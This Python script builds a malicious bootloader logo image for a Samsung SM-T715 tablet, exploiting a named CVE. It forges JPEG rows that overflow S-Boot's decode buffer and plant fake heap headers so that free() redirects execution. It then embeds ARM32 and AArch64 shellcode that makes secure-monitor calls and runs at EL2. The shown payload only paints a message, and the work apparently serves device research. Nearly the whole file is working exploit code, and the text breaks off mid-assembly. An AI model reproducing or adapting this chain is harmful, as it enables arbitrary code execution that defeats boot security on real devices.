#!/usr/bin/env python3

# SPDX-License-Identifier: MIT
# Copyright (c) 2026 elkir0
# Parts derived from bnuuyloader (https://github.com/meowybnuuy/bnuuyloader), MIT,
# Copyright (c) 2026 meowybnuuy: see the comments that name "the Note 4 loader".

"""Build the first hijack PARAM image for the SM-T715 (CVE-2026-21155, the ARM64 step).

    python3 -I build_hijack.py STOCK_PARAM OUT_PARAM --width W [--out-jpeg FILE] [--plan]

The stock ``logo.jpg`` is replaced by a wide, mostly black JPEG whose last rows overflow
the 12 MiB decode buffer and the free heap block, up to the estimated header of the lowest
libjpeg block. Every 16-byte slot of those rows holds a header: one slot in three is forged
with ``prev = P`` and ``next = N``, the others point at a harmless place. The image stops on
the row of the estimate, so nothing above it is written: the decoder's working buffers stay
intact, and a header higher than expected is simply left alone (a harmless miss).

When ``jpeg_destroy`` frees that block, S-Boot's free() writes N over the saved return
address of the logo loader (P+12). The loader returns into N: sixteen bytes in the logo
file, copied to the file buffer at 0x24200000, followed by an ARM32 stub that cleans its
caches and calls monitor function 0x82000400, which enters AArch64 code at EL2. That code
paints a message on the bootloader framebuffer and halts: the tablet stays in the
bootloader with "ARM64 OK!" on screen until it is recovered by hand.
"""

from __future__ import annotations

import argparse
import hashlib
import io
import struct
import subprocess
import sys
from pathlib import Path

import numpy as np
from PIL import Image

sys.path.insert(0, str(Path(__file__).resolve().parent))
import jpegforge as jf  # noqa: E402  (our own module, same directory)
import build_calib as bc  # noqa: E402

FILE_BUFFER = 0x24200000
FILE_BUFFER_SIZE = 0x100000
SAFE = 0x24300000            # the black first row of the decode buffer
LR_SLOT = 0x23EC00B4         # saved return address of the logo loader FUN_23e07b74 (main pushes 6 registers)
PREV = LR_SLOT - 12          # free() writes next at prev+12; the byte at prev+4 is the loader's saved r5, "logo.jpg"
HEAP_HEAD = 0x23EC1048       # the DRAM heap's list head, in S-Boot's data
HEAP_FREE_BLOCK = 0x24F00000 # the heap's first node: left at zero, the next malloc_large walks into address 0
DATA_AT = 0x200000           # past this the partition is S-Boot's: command line at 0x700000, two records at the end
ROWS_BELOW = 26              # forged rows below the row of the estimate, down to just above the heap header
TEXT_PAD = 0x1000            # font, strings, scratch and exception vectors precede the AArch64 code
STUB_ROOM = 2048             # reserved for the trampolines, the ARM32 stub and its exception vectors
TRAMPOLINES = 64             # three 16-byte entries, one per slot phase, then the stub
STACK = FILE_BUFFER + 0xFD000
CELL = FILE_BUFFER + 0xFFF00  # what the ARM32 stub and the AArch64 entry leave for a later pass

FONT = {  # 5x7 glyphs, one byte per row, bit 4 on the left; digits then A-F, so that a glyph index is its hex digit
    "0": (0x0E, 0x11, 0x13, 0x15, 0x19, 0x11, 0x0E), "1": (0x04, 0x0C, 0x04, 0x04, 0x04, 0x04, 0x0E),
    "2": (0x0E, 0x11, 0x01, 0x02, 0x04, 0x08, 0x1F), "3": (0x1F, 0x02, 0x04, 0x02, 0x01, 0x11, 0x0E),
    "4": (0x02, 0x06, 0x0A, 0x12, 0x1F, 0x02, 0x02), "5": (0x1F, 0x10, 0x1E, 0x01, 0x01, 0x11, 0x0E),
    "6": (0x06, 0x08, 0x10, 0x1E, 0x11, 0x11, 0x0E), "7": (0x1F, 0x01, 0x02, 0x04, 0x08, 0x08, 0x08),
    "8": (0x0E, 0x11, 0x11, 0x0E, 0x11, 0x11, 0x0E), "9": (0x0E, 0x11, 0x11, 0x0F, 0x01, 0x02, 0x0C),
    "A": (0x0E, 0x11, 0x11, 0x1F, 0x11, 0x11, 0x11), "B": (0x1E, 0x11, 0x11, 0x1E, 0x11, 0x11, 0x1E),
    "C": (0x0E, 0x11, 0x10, 0x10, 0x10, 0x11, 0x0E), "D": (0x1C, 0x12, 0x11, 0x11, 0x11, 0x12, 0x1C),
    "E": (0x1F, 0x10, 0x10, 0x1E, 0x10, 0x10, 0x1F), "F": (0x1F, 0x10, 0x10, 0x1E, 0x10, 0x10, 0x10),
    "=": (0x00, 0x00, 0x1F, 0x00, 0x1F, 0x00, 0x00), " ": (0,) * 7,
    "X": (0x11, 0x11, 0x0A, 0x04, 0x0A, 0x11, 0x11), "S": (0x0E, 0x11, 0x10, 0x0E, 0x01, 0x11, 0x0E),
    "P": (0x1E, 0x11, 0x11, 0x1E, 0x10, 0x10, 0x10), "L": (0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0x1F),
    "R": (0x1E, 0x11, 0x11, 0x1E, 0x14, 0x12, 0x11), "K": (0x11, 0x12, 0x14, 0x18, 0x14, 0x12, 0x11),
    "O": (0x0E, 0x11, 0x11, 0x11, 0x11, 0x11, 0x0E),
    "T": (0x1F, 0x04, 0x04, 0x04, 0x04, 0x04, 0x04), "M": (0x11, 0x1B, 0x15, 0x15, 0x11, 0x11, 0x11),
    "!": (0x04, 0x04, 0x04, 0x04, 0x04, 0x00, 0x04),
}
LINES = ("ARM64 OK!", "T715 5433")
PAINT_ONLY = False


def lo(address: int) -> int:
    return address & 0xFFFF


def hi(address: int) -> int:
    return address >> 16


class Layout:
    """Where the rows of a ``width``-wide image land."""

    def __init__(self, width: int) -> None:
        self.width = width
        self.row_bytes = width * 3
        self.stride = (self.row_bytes + 3) & ~3
        if self.stride % 16 or self.stride - self.row_bytes not in (0, 2) or width % 16 not in (0, 10):
            raise ValueError(f"width {width}: stride {self.stride} leaves {self.stride - self.row_bytes} pad byte(s)")
        self.estimate = bc.lowest_header_estimate(width)
        self.row_of_estimate = (self.estimate - bc.DECODE_BUFFER) // self.stride
        self.height = self.row_of_estimate + 1  # nothing is written above the row of the estimate
        self.first_forged_row = max(0, 8 * ((self.row_of_estimate - ROWS_BELOW) // 8))

    def row_start(self, row: int) -> int:
        return bc.DECODE_BUFFER + self.stride * row

    def forged(self, address: int) -> bool:
        """Would this 16-aligned address carry a forged header? Every slot is one."""
        row = (address - bc.DECODE_BUFFER) // self.stride
        if not self.first_forged_row <= row < self.height:
            return False
        return True


def fill_pixels(reach: np.ndarray, row: list, yccs: list) -> bool:
    """Choose the free bytes of a row so that every pixel is an exactly reachable colour."""
    for j in range(len(row) // 3):
        cells = row[3 * j:3 * j + 3]
        free = [i for i, v in enumerate(cells) if v is None]
        found = None
        for values in np.ndindex(*(256,) * len(free)):
            rgb = [cells[i] if cells[i] is not None else int(values[free.index(i)]) for i in range(3)]
            if reach[rgb[0], rgb[1], rgb[2]]:
                ycc = jf.find_ycc((rgb[0], rgb[1], rgb[2]))
                if ycc is not None:
                    found = (rgb, ycc)
                    break
        if found is None:
            return False
        row[3 * j:3 * j + 3], ycc = found
        yccs.append(ycc)
    return True


def slot(row: list, base: int, nxt: int) -> None:
    """A forged header at byte ``base``: size and flags free, prev, next."""
    row[base + 8:base + 12] = list(struct.pack("<I", PREV))
    row[base + 12:base + 16] = list(struct.pack("<I", nxt))


def find_code_addresses(reach: np.ndarray, prev: int, min_offset: int):
    """A file offset past ``min_offset`` and the three N it gives, one per slot phase.

    A slot starts at a 16-byte boundary; (slot + 8) % 3 is its phase, i.e. where the prev
    field falls inside a pixel. The three trampolines sit at offset, offset + 16 and
    offset + 32, so each N's bytes are fixed by the offset; the headers repeat every 48
    bytes, and every pixel of that period must be an exactly reachable colour.
    """
    assert struct.pack("<I", prev) == struct.pack("<I", PREV)
    for offset in range((min_offset + 15) & ~15, FILE_BUFFER_SIZE - 48, 16):
        nexts = {phase: FILE_BUFFER + offset + 16 * phase for phase in range(3)}
        period: list[int | None] = [None] * 48
        for base in (0, 16, 32):
            slot(period, base, nexts[(base + 8) % 3])
        if fill_pixels(reach, period, []):
            return offset, nexts
    return None


def solve_row(reach: np.ndarray, layout: Layout, nexts: dict[int, int]):
    """One forged row, exactly decodable: every 16-byte slot is a forged header.

    The phase of a slot picks its N, so that no pixel of three pointer bytes has an
    unreachable colour. Returns the row, the (Y, Cb, Cr) of its pixels, and the end of the
    last complete slot. Only the slot cut by the row's pad bytes stays harmless.
    """
    row_bytes = layout.row_bytes
    row: list[int | None] = [None] * row_bytes
    safe_bytes = struct.pack("<I", SAFE)
    base = 0
    while base + 20 <= row_bytes:  # the header and libjpeg's next pointer must both be written
        slot(row, base, nexts[(base + 8) % 3])
        base += 16
    if base < row_bytes:  # the slot a pad byte cuts: a harmless header, as far as the row reaches
        row[base + 1:base + 4] = [0, 0, 0]
        row[base + 8:base + 12] = list(safe_bytes)
        row[base + 12:min(base + 16, row_bytes)] = list(safe_bytes)[:max(0, min(16, row_bytes - base) - 12)]
    yccs: list[tuple[int, int, int]] = []
    if not fill_pixels(reach, row, yccs):
        return None
    print(f"  per row: {base // 16} slots, all forged but the cut one; all {len(yccs)} pixels exact")
    return bytes(row), yccs, base - 16 + 20  # type: ignore[arg-type]


def heap_header(reach: np.ndarray, layout: Layout):
    """What to write over the free block's header: (row, offset in it, the row, the 16 bytes).

    The allocator walks the list with ``next`` until it is back at the head, and never reads the
    free block's ``prev``: so a size, a nonzero free byte, anything as prev, the head as next.
    The size is below the real one so that a merge with the block above stays inside the heap.
    """
    row, offset = divmod(HEAP_FREE_BLOCK - bc.DECODE_BUFFER, layout.stride)
    if offset % 3 != 1:
        raise SystemExit(f"width {layout.width}: the free block's header starts at byte {offset % 3} of a pixel; it must start at 1")
    for size in (0x1D0000, 0x1C0000, 0x1D8000, 0x1DF000, 0x1E00000, 0x1C8000, 0x180000):
        for free in range(1, 256):
            slot = struct.pack("<III", size, free, 0) + struct.pack("<I", HEAP_HEAD)
            row_bytes = bytearray(layout.row_bytes)
            row_bytes[offset:offset + 16] = slot
            if all(jf.find_ycc(tuple(row_bytes[3 * q:3 * q + 3])) for q in range(offset // 3, (offset + 15) // 3 + 1)):
                return row, offset, bytes(row_bytes), slot
    raise SystemExit(f"width {layout.width}: no size gives an exactly decodable header")


def build_jpeg(layout: Layout, row: bytes, yccs, last_slot_end: int,
               heap_row: int, heap_offset: int, heap_row_bytes: bytes) -> bytes:
    """Black, except the free block's header in one row and the forged row in the last bands."""
    types: dict[tuple, list] = {}

    def solve(key, columns):
        solved = []
        for component in range(3):
            samples = tuple(px[component] for _ in range(8) for px in columns)
            coefs = jf.solve_block2d(samples)
            assert coefs is not None, (key, component)
            solved.append(list(coefs))
        types[key] = solved

    def column_type(bx: int) -> list:
        if 24 * bx + 24 <= last_slot_end:
            key = ("period", bx % 2)
            if key not in types:
                solve(key, yccs[8 * (bx % 2):8 * (bx % 2) + 8])
        else:
            key = ("tail", bx)
            if key not in types:
                pixels = [tuple(row[24 * bx + 3 * x + c] for c in range(3)) if 24 * bx + 3 * x + 3 <= len(row)
                          else (0, 128, 128) for x in range(8)]
                found = [jf.find_ycc(p) for p in pixels]
                assert all(found), "a padding pixel is not exactly representable"
                solve(key, found)  # type: ignore[arg-type]
        return types[key]

    columns = [column_type(bx) for bx in range((layout.width + 7) // 8)]
    blocks = {(by, bx): columns[bx]
              for by in range(layout.first_forged_row // 8, (layout.height - 1) // 8 + 1) for bx in range(len(columns))}

    # The row holding the free block's header is written in all eight rows of its band, like the
    # forged rows: the copies above land in the free block's unused space, and identical rows solve.
    for bx in range(heap_offset // 3 // 8, ((heap_offset + 15) // 3) // 8 + 1):
        columns = []
        for x in range(8):
            at = 24 * bx + 3 * x
            found = jf.find_ycc(tuple(heap_row_bytes[at:at + 3]) if at + 3 <= len(heap_row_bytes) else (0, 128, 128))
            assert found is not None, "a pixel of the heap header is not exactly representable"
            columns.append(found)
        solve(("heap", bx), columns)
        blocks[(heap_row // 8, bx)] = types[("heap", bx)]
    return jf.encode_jpeg(layout.width, layout.height, blocks)


def verify(jpeg: bytes, layout: Layout, row: bytes, heap_row: int, heap_row_bytes: bytes) -> list[str]:
    problems = []
    with Image.open(io.BytesIO(jpeg)) as image:
        image.load()
        raw = image.tobytes()
    n = layout.row_bytes
    for r in range(layout.first_forged_row, layout.height):
        got = raw[r * n:(r + 1) * n]
        if got != row:
            first = next(i for i in range(n) if got[i] != row[i])
            problems.append(f"row {r}: first difference at byte {first}")
    for r in (0, layout.first_forged_row - 9 if layout.first_forged_row - 1 <= heap_row + 7 else layout.first_forged_row - 1):
        if r >= 0 and raw[r * n:(r + 1) * n].strip(b"\0"):
            problems.append(f"row {r} is not black")
    if raw[heap_row * n:(heap_row + 1) * n] != heap_row_bytes:
        problems.append(f"row {heap_row}: the free block's header is not what was asked")
    return problems


# ---------------------------------------------------------------- payload


def elf_text(path: Path) -> bytes:
    """The .text of an object file; anything a linker would have to patch is refused."""
    data = path.read_bytes()
    assert data[:4] == b"\x7fELF", "not an ELF object"
    is64 = data[4] == 2
    if is64:
        shoff, = struct.unpack_from("<Q", data, 0x28)
        shentsize, shnum, shstrndx = struct.unpack_from("<HHH", data, 0x3A)
    else:
        shoff, = struct.unpack_from("<I", data, 0x20)
        shentsize, shnum, shstrndx = struct.unpack_from("<HHH", data, 0x2E)
    sections = [struct.unpack_from("<IIQQQQIIQQ" if is64 else "<10I", data, shoff + i * shentsize) for i in range(shnum)]
    names = sections[shstrndx]

    def name(section) -> str:
        start = names[4] + section[0]
        return data[start:data.index(b"\0", start)].decode()

    texts = [i for i, section in enumerate(sections) if name(section) == ".text"]
    assert len(texts) == 1, f"{path.name}: {len(texts)} .text sections"
    for section in sections:
        if section[1] in (4, 9) and section[7] == texts[0]:  # REL, RELA whose target is .text
            raise SystemExit(f"{path.name}: relocation section {name(section)}: the code must stand alone")
    text = sections[texts[0]]
    return data[text[4]:text[4] + text[5]]


def assemble(source: str, target: str, work: Path, stem: str, defines: dict[str, int]) -> bytes:
    source_path, object_path = work / f"{stem}.S", work / f"{stem}.o"
    source_path.write_text(source)
    command = ["clang", f"--target={target}", "-mcpu=cortex-a53", "-fno-asynchronous-unwind-tables", "-c", "-o", str(object_path)]
    for key, value in defines.items():
        command.append(f"-D{key}={value:#x}")
    subprocess.run(command + [str(source_path)], check=True)
    return elf_text(object_path)


def a64_source(text_base: int) -> str:
    glyph = {ch: i for i, ch in enumerate(FONT)}
    label = lambda a, b: glyph[a] | (glyph[b] << 8)  # noqa: E731
    font_bytes = ", ".join(f"0x{v:02x}" for ch in FONT for v in FONT[ch] + (0,))
    lines = [", ".join(str(glyph[ch]) for ch in text) for text in LINES]
    return f"""
    .section .text,"ax",%progbits
    .global _start
font:                                   /* 0x000 */
    .byte {font_bytes}
    .space {256 - 8 * len(FONT)}
str1:                                   /* 0x100 */
    .byte {lines[0]}
    .space {384 - 256 - len(LINES[0])}
str2:                                   /* 0x180 */
    .byte {lines[1]}
    .space {512 - 384 - len(LINES[1])}
                                        /* 0x200: scratch for the report, 32 bytes a line */
    .space 1536
vectors:                                /* 0x800: synchronous exceptions are reported, interrupts are masked and resumed */
    .rept 4
        b       fault
        .space 124
        msr     daifset, #0xf
        eret
        .space 120
        msr     daifset, #0xf
        eret
        .space 120
        b       fault
        .space 124
    .endr
_start:                                 /* 0x1000: unknown EL, unknown MMU state; no memory access until the MMU is off */
    .word   0xEA0107FF                 /* AArch32: b to the 32-bit entry, 0x42004 bytes on; AArch64: ands xzr, xzr, xzr */
    msr     daifset, #0xf
    mrs     x18, currentel
    ubfx    x18, x18, #2, #2
    cmp     x18, #3
    b.ne    1f
    mrs     x23, sctlr_el3
    bic     x10, x23, #1
    msr     sctlr_el3, x10
    isb
    tlbi    alle3
    b       3f
1:  cmp     x18, #2
    b.ne    2f
    mrs     x23, sctlr_el2
    bic     x10, x23, #1
    msr     sctlr_el2, x10
    isb
    tlbi    alle2
    b       3f
2:  mrs     x23, sctlr_el1
    bic     x10, x23, #1
    msr     sctlr_el1, x10
    isb
    tlbi    vmalle1
3:  dsb     sy
    isb

    movz    x19, #0
    movk    x19, #0x6700, lsl #16       /* bootloader framebuffer */
    movz    x20, #1536
    movz    x22, #0x1800                /* 6144 bytes a row */
    add     x24, x19, #0x60000           /* row 64, right under the ARM32 band */
    movz    w25, #0xFF
    movk    w25, #0xFF, lsl #16          /* magenta: the AArch64 entry was reached */
    str     w25, [x24]
    dc      cvac, x24
    dsb     sy

    movz    x29, #CELL_LO
    movk    x29, #CELL_HI, lsl #16       /* read back by the ARM32 stub on a later pass */
    movz    w10, #0x3421
    movk    w10, #0x4136, lsl #16
    str     w10, [x29, #0xC]
    str     x18, [x29, #0x10]
    str     x23, [x29, #0x14]
    str     x0, [x29, #0x18]
    str     x1, [x29, #0x1C]
    str     x2, [x29, #0x20]
    str     x3, [x29, #0x24]
    mov     x10, sp
    str     x10, [x29, #0x28]
    dc      cvac, x29
    add     x10, x29, #0x40
    dc      cvac, x10
    dsb     sy
    mov     x28, #1                      /* checkpoint */

    movz    x10, #VEC_LO
    movk    x10, #VEC_HI, lsl #16
    cmp     x18, #3
    b.eq    4f
    cmp     x18, #2
    b.eq    5f
    msr     vbar_el1, x10
    b       6f
4:  msr     vbar_el3, x10
    b       6f
5:  msr     vbar_el2, x10
6:  movz    w25, #0xFFFF                 /* cyan: exceptions are ours now */
    str     w25, [x24, #4]
    dc      cvac, x24
    dsb     sy
    mov     x28, #2

    movz    x9, #STACK_LO
    movk    x9, #STACK_HI, lsl #16
    mov     sp, x9

    mov     x16, #80                     /* a black window for the report */
    mov     x17, #400
    movz    w25, #0
    bl      fill_rows
    mov     x28, #3

    movz    x27, #FONT_LO
    movk    x27, #FONT_HI, lsl #16
    mov     x0, x18
    movz    w1, #{label("E", "L")}
    mov     x15, #0
    bl      draw_value
    mov     x0, x23
    movz    w1, #{label("S", "C")}
    mov     x15, #1
    bl      draw_value
    ldr     x0, [x29, #0x18]
    movz    w1, #{label("X", "0")}
    mov     x15, #2
    bl      draw_value
    ldr     x0, [x29, #0x1C]
    movz    w1, #{label("X", "1")}
    mov     x15, #3
    bl      draw_value
    ldr     x0, [x29, #0x20]
    movz    w1, #{label("X", "2")}
    mov     x15, #4
    bl      draw_value
    ldr     x0, [x29, #0x24]
    movz    w1, #{label("X", "3")}
    mov     x15, #5
    bl      draw_value
    ldr     x0, [x29, #0x28]
    movz    w1, #{label("S", "P")}
    mov     x15, #6
    bl      draw_value
    mov     x28, #4

    mov     x16, #400                    /* red over green, as before */
    mov     x17, #1024
    movz    w25, #0xC0, lsl #16
    bl      fill_rows
    mov     x16, #1024
    mov     x17, #2048
    movz    w25, #0xC000
    bl      fill_rows
    mov     x28, #5
    movz    w25, #0xFFFF
    movk    w25, #0xFF, lsl #16          /* white */
    movz    x0, #STR1_LO
    movk    x0, #STR1_HI, lsl #16
    movz    x1, #192
    movz    x2, #640
    movz    x3, #24
    movz    x4, #{len(LINES[0])}
    bl      draw_line
    movz    x0, #STR2_LO
    movk    x0, #STR2_HI, lsl #16
    movz    x1, #192
    movz    x2, #840
    movz    x3, #24
    movz    x4, #{len(LINES[1])}
    bl      draw_line
    mov     x28, #6

    mov     x9, x19
    movz    x10, #0xC0, lsl #16
    add     x10, x10, x19
7:  dc      cvac, x9
    add     x9, x9, #64
    cmp     x9, x10
    b.lt    7b
    dsb     sy
    mov     x28, #7
halt:
    b       halt

fill_rows:                              /* x16 first row, x17 end row, x25 colour */
    mov     x15, x16
8:  madd    x24, x15, x22, x19
    mov     x26, xzr
9:  str     w25, [x24], #4
    add     x26, x26, #1
    cmp     x26, x20
    b.lt    9b
    add     x15, x15, #1
    cmp     x15, x17
    b.lt    8b
    ret

draw_value:                             /* x0 value, x1 two label glyphs, x15 line: "LA=0123456789ABCDEF" */
    movz    x10, #SCR_LO
    movk    x10, #SCR_HI, lsl #16
    add     x11, x10, x15, lsl #5
    strb    w1, [x11]
    lsr     x12, x1, #8
    strb    w12, [x11, #1]
    mov     w12, #{glyph["="]}
    strb    w12, [x11, #2]
    add     x11, x11, #3
    mov     x13, #60
    mov     x14, #0
10: lsr     x12, x0, x13
    and     w12, w12, #0xF
    strb    w12, [x11, x14]
    add     x14, x14, #1
    subs    x13, x13, #4
    b.ge    10b
    mov     x0, x10
    movz    x1, #40
    lsl     x2, x15, #5
    add     x2, x2, #100
    movz    x3, #4
    movz    x4, #19
    bl      draw_line
    ret

draw_line:                              /* x0 glyph string, x1 x, x2 y, x3 scale, x4 length */
    mov     x14, xzr                     /* character */
Lchar:
    ldrb    w9, [x0, x14]
    add     x10, x27, x9, lsl #3
    mov     x11, xzr                     /* glyph row */
Lrow:
    ldrb    w12, [x10, x11]
    mov     x13, xzr                     /* glyph column */
Lbit:
    and     w17, w12, #0x10
    cbz     w17, 5f
    mov     x15, #6
    mul     x16, x14, x15
    add     x16, x16, x13
    mul     x16, x16, x3
    add     x16, x16, x1                 /* left edge */
    mul     x17, x11, x3
    add     x17, x17, x2                 /* top edge */
    mov     x5, xzr
6:  add     x7, x17, x5
    mul     x7, x7, x22
    add     x7, x7, x19
    add     x7, x7, x16, lsl #2
    mov     x26, xzr
11: str     w25, [x7], #4
    add     x26, x26, #1
    cmp     x26, x3
    b.lt    11b
    add     x5, x5, #1
    cmp     x5, x3
    b.lt    6b
5:  lsl     w12, w12, #1
    add     x13, x13, #1
    cmp     x13, #5
    b.lt    Lbit
    add     x11, x11, #1
    cmp     x11, #7
    b.lt    Lrow
    add     x14, x14, #1
    cmp     x14, x4
    b.lt    Lchar
    ret

fault:                                  /* a synchronous exception at our EL: MMU off, then report */
    cmp     x18, #3
    b.ne    21f
    mrs     x10, sctlr_el3
    bic     x10, x10, #1
    msr     sctlr_el3, x10
    isb
    tlbi    alle3
    mrs     x21, esr_el3
    mrs     x22, far_el3
    mrs     x23, elr_el3
    b       23f
21: cmp     x18, #2
    b.ne    22f
    mrs     x10, sctlr_el2
    bic     x10, x10, #1
    msr     sctlr_el2, x10
    isb
    tlbi    alle2
    mrs     x21, esr_el2
    mrs     x22, far_el2
    mrs     x23, elr_el2
    b       23f
22: mrs     x10, sctlr_el1
    bic     x10, x10, #1
    msr     sctlr_el1, x10
    isb
    tlbi    vmalle1
    mrs     x21, esr_el1
    mrs     x22, far_el1
    mrs     x23, elr_el1
23: dsb     sy
    isb
    movz    x29, #CELL_LO
    movk    x29, #CELL_HI, lsl #16
    movz    w10, #0x3421
    movk    w10, #0x4136, lsl #16
    str     w10, [x29, #0xC]
    str     x21, [x29, #0x2C]
    str     x22, [x29, #0x30]
    str     x23, [x29, #0x34]
    str     x28, [x29, #0x38]
    dc      cvac, x29
    dsb     sy
    movz    x19, #0
    movk    x19, #0x6700, lsl #16
    movz    x20, #1536
    movz    x22, #0x1800
    movz    x27, #FONT_LO
    movk    x27, #FONT_HI, lsl #16
    mov     x16, #80
    mov     x17, #400
    movz    w25, #0xC0, lsl #16          /* red window */
    bl      fill_rows
    movz    w25, #0xFFFF
    movk    w25, #0xFF, lsl #16
    mov     x0, x18
    movz    w1, #{label("E", "L")}
    mov     x15, #0
    bl      draw_value
    mov     x0, x21
    movz    w1, #{label("E", "S")}
    mov     x15, #1
    bl      draw_value
    mov     x0, x22
    movz    w1, #{label("F", "A")}
    mov     x15, #2
    bl      draw_value
    mov     x0, x23
    movz    w1, #{label("P", "C")}
    mov     x15, #3
    bl      draw_value
    mov     x0, x28
    movz    w1, #{label("C", "K")}
    mov     x15, #4
    bl      draw_value
    mov     x9, x19
    movz    x10, #0xC0, lsl #16
    add     x10, x10, x19
24: dc      cvac, x9
    add     x9, x9, #64
    cmp     x9, x10
    b.lt    24b
    dsb     sy
    b       halt
"""


A32_SOURCE = """
    .syntax unified
    .arm
    .section .text,"ax",%progbits
    .global _start
_start:                         /* the loader's saved return address now holds N */
    b       stub
    .word   0                   /* free() tests this byte and stops */
    .word   0                   /* free() writes prev here */
    .word   0
stub:                           /* r5: the cell that survives a warm reset, at the top of the file buffer */
    movw    r5, #CELL_LO
    movt    r5, #CELL_HI
    movw    r7, #0x4150
    movt    r7, #0x3153
    ldr     r6, [r5]
    cmp     r6, r7
    bne     fresh
    ldr     r6, [r5, #4]
    add     r6, r6, #1
    str     r6, [r5, #4]
    b       have
fresh:
    mov     r6, #1
    str     r7, [r5]
    str     r6, [r5, #4]
    mvn     r6, #0
    str     r6, [r5, #8]
    mov     r6, #0
    str     r6, [r5, #0xC]
    str     r6, [r5, #0x10]
have:
    add     r4, r5, #64
    mcr     p15, 0, r5, c7, c10, 1
    mcr     p15, 0, r4, c7, c10, 1
    dsb     sy
    movw    r1, #0xFF00
    movt    r1, #0x00FF              /* yellow on the first pass */
    ldr     r6, [r5, #4]
    cmp     r6, #1
    beq     first
    ldr     r6, [r5, #0xC]
    cmp     r6, #0
    movwne  r1, #0xFFFF              /* cyan: an entry was reached */
    movtne  r1, #0
    bne     first
    ldr     r6, [r5, #8]
    cmp     r6, #0
    movweq  r1, #0xFF00              /* magenta: returned 0, nothing reached */
    movteq  r1, #0x00FF00
    beq     first
    cmn     r6, #1
    moveq   r1, #0xFF0000            /* red: returned -1 */
    beq     first
    movw    r1, #0xFF                /* blue: anything else */
    movt    r1, #0
first:
    adr     r4, 9f                  /* call without bl: the assembler leaves bl to a local label unresolved */
    b       band
9:
    movw    r9, #0xFFFF             /* white */
    movt    r9, #0x00FF
    ldr     r6, [r5, #4]             /* row 64: one white pixel per pass */
    cmp     r6, #1536
    movhi   r6, #1536
    movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
count:
    str     r9, [r0], #4
    subs    r6, r6, #1
    bne     count
    mrs     r6, cpsr                 /* row 65: one white pixel in Hyp mode, two in SVC, three otherwise */
    and     r6, r6, #0x1F
    movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
    add     r0, r0, #0x1800
    mov     r1, #1
    cmp     r6, #0x1A
    beq     7f
    mov     r1, #2
    cmp     r6, #0x13
    beq     7f
    mov     r1, #3
7:  str     r9, [r0], #4
    subs    r1, r1, #1
    bne     7b
    movw    r0, #0
    movt    r0, #0x6700
    add     r0, r0, #0x60000
    add     r2, r0, #0x3000
flushc:
    mcr     p15, 0, r0, c7, c10, 1
    add     r0, r0, #64
    cmp     r0, r2
    blo     flushc
    dsb     sy
counted:
    adr     r0, vectors32            /* my own exception vectors, for whichever table is in use */
    mcr     p15, 0, r0, c12, c0, 0    /* VBAR */
    mcr     p15, 4, r0, c12, c0, 0    /* HVBAR */
    isb
    movw    r4, #CLEAN_START_LO      /* clean the data cache over the whole payload */
    movt    r4, #CLEAN_START_HI
    movw    r6, #CLEAN_END_LO
    movt    r6, #CLEAN_END_HI
clean:
    mcr     p15, 0, r4, c7, c10, 1   /* DCCMVAC */
    add     r4, r4, #64
    cmp     r4, r6
    blo     clean
    dsb     sy
    mcr     p15, 0, r0, c7, c5, 0    /* ICIALLU: the code was written as data */
    dsb     sy
    isb
    cpsid   aif                     /* nothing may interrupt what follows */
    movw    r9, #0
    movt    r9, #0xFF00              /* red: the call returned 0 */
    movw    r10, #0xFF
    movt    r10, #0                  /* blue: another value */
    movw    r11, #0xFF00
    movt    r11, #0                  /* green: the number came back unchanged, the call was skipped */
    movw    r0, #0xFFFF              /* call 1: a number the monitor does not know */
    movt    r0, #0x8200
    mov     r7, r0
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    movw    r8, #0
    movt    r8, #0x6700              /* the bar at x = 0..3 */
    smc     #0
    str     r10, [r8]
    mov     r1, r10
    cmp     r0, #0
    moveq   r1, r9
    cmp     r0, r7
    moveq   r1, r11
    str     r1, [r8]
    str     r1, [r8, #4]
    str     r1, [r8, #8]
    str     r1, [r8, #12]
    mcr     p15, 0, r8, c7, c10, 1
    dsb     sy
    movw    r6, #0xF080
    movt    r6, #0x02FA
    adr     r4, 9f
    b       wait
9:
    mov     r1, #0xFF00             /* green band: alive after a call the monitor does not know */
    adr     r4, 9f
    b       band
9:
    mrs     r6, cpsr                 /* MMU off, so that the display controller can be reached whatever the tables */
    and     r6, r6, #0x1F
    cmp     r6, #0x1A
    bne     21f
    mrc     p15, 4, r0, c1, c0, 0    /* HSCTLR */
    bic     r0, r0, #1
    mcr     p15, 4, r0, c1, c0, 0
    isb
    b       22f
21: mrc     p15, 0, r0, c1, c0, 0    /* SCTLR */
    bic     r0, r0, #1
    mcr     p15, 0, r0, c1, c0, 0
    isb
22: movw    r0, #0x1410              /* DECON update and trigger, as the Note 4 loader does */
    movt    r0, #0x1380
    ldr     r1, [r0]
    orr     r1, r1, #1
    str     r1, [r0]
    movw    r0, #0x2040
    movt    r0, #0x1380
    movw    r1, #3
    movt    r1, #0xE000
    str     r1, [r0]
    dsb     sy
    mov     r1, #0xFF                /* blue band: the display controller was kicked */
    movt    r1, #0
    adr     r4, 9f
    b       band
9:
    movw    r0, #0x0401             /* call 2: 0x82000401 with 0 */
    movt    r0, #0x8200
    mov     r7, r0
    mov     r1, #0
    mov     r2, #0
    mov     r3, #0
    add     r8, r8, #0x200           /* the bar at x = 128..131 */
    smc     #0
    str     r10, [r8]
    mov     r1, r10
    cmp     r0, #0
    moveq   r1, r9
    cmp     r0, r7
    moveq   r1, r11
    str     r1, [r8]
    str     r1, [r8, #4]
    str     r1, [r8, #8]
    str     r1, [r8, #12]
    mcr     p15, 0, r8, c7, c10, 1
    dsb     sy
    movw    r6, #0xF080
    movt    r6, #0x02FA
    adr     r4, 9f
    b       wait
9:
    movw    r1, #0xFF               /* magenta band: alive after 0x401 too */
    movt    r1, #0xFF
    adr     r4, 9f
    b       band
9:
    movw    r0, #0x0400             /* call 3: 0x82000400 with the entry, as bnuuyloader does */
    movt    r0, #0x8200
    mov     r7, r0
    movw    r1, #ENTRY_LO
    movt    r1, #ENTRY_HI
    mov     r2, #0x800
    mov     r3, #1
    add     r8, r8, #0x200           /* the bar at x = 256..259 */
    smc     #0
    str     r10, [r8]
    mov     r1, r10
    cmp     r0, #0
    moveq   r1, r9
    cmp     r0, r7
    moveq   r1, r11
    str     r1, [r8]
    str     r1, [r8, #4]
    str     r1, [r8, #8]
    str     r1, [r8, #12]
    mcr     p15, 0, r8, c7, c10, 1
    dsb     sy
    movw    r6, #0xF080
